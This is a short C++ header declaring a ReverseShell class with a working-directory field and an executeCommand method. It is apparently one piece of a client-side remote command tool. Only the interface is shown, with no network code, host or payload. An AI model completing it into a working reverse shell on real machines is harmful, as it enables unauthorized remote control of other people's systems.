#ifndef CLIENT_REVERSESHELL_H
#define CLIENT_REVERSESHELL_H

#include <string>
#include <array>
#include <memory>
#include <iostream>
#include <cstring>

class ReverseShell {
private:
    std::wstring currentDirectory=L".";
public:
    ReverseShell() = default;
    std::string executeCommand(const std::wstring&);
};


#endif
